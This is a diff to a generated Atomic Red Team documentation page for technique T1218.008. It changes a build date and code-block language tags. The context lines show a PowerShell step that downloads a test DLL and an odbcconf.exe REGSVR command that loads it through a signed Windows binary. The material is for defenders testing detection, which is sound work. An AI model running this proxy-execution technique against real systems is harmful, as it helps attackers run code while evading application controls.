@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218.008"
 attack_technique_name: "Signed Binary Proxy Execution: Odbcconf"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.008/T1218.008.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "2430498b-06c0-4b92-a448-8ad263c388e2"
@@ -51,13 +51,13 @@ T1218-2.dll must exist on disk at specified location (#{dll_payload})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/src/Win32/T1218-2.dll" -OutFile "#{dll_payload}"
 ```
@@ -68,7 +68,7 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
 ```
 
